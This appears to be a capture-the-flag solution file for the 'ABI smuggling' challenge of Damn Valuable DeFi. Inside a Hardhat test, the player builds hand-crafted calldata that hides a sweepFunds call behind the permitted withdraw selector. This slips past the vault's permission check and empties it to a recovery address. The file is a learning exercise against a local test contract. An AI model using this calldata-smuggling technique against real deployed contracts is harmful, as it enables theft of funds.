const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, recovery] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        console.log('deployerPermission', deployerPermission);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        console.log('playerPermission', playerPermission);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const accounts = config.networks.hardhat.accounts;
        const index = 1; // first wallet, increment for next wallets
        const playerPrivateKey = (ethers.Wallet.fromMnemonic(accounts.mnemonic, accounts.path + `/${index}`)).privateKey;
        const playerHDWallet = new ethers.Wallet(playerPrivateKey, ethers.provider)

        console.log("initialized", await vault.initialized());
        const SelfAuthorizedVault = await ethers.getContractFactory('SelfAuthorizedVault')
        var sweepFunds = SelfAuthorizedVault.interface.encodeFunctionData('sweepFunds', [
            recovery.address,
            token.address
        ])
        var rawData = SelfAuthorizedVault.interface.encodeFunctionData('execute', [
            vault.address,
            sweepFunds
        ])
        console.log('before', rawData);
        // rawData = rawData.replace('000004000000', '000004800000')
        rawData = '0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000640000000000000000000000000000000000000000000000000000000000000000d9caed12000000000000000000000000000000000000000000000000000000000000004885fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000';
        // rawData = rawData.replace('000048d9', '000047d9')
        console.log('after.', rawData);

        // console.log(SelfAuthorizedVault.interface.decodeFunctionResult('testGetExecuteActionId', await ethers.provider.call({
        //     to: vault.address,
        //     data: rawData
        // })));

        const nonce = await ethers.provider.getTransactionCount(player.address);
        const gasLimit = 1000000
        const gasPrice = await ethers.provider.getGasPrice()

        const signedTransaction = await playerHDWallet.signTransaction({
            from: player.address,
            to: vault.address,
            data: rawData,
            gasLimit,
            gasPrice,
            nonce
        })
        await ethers.provider.sendTransaction(signedTransaction)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
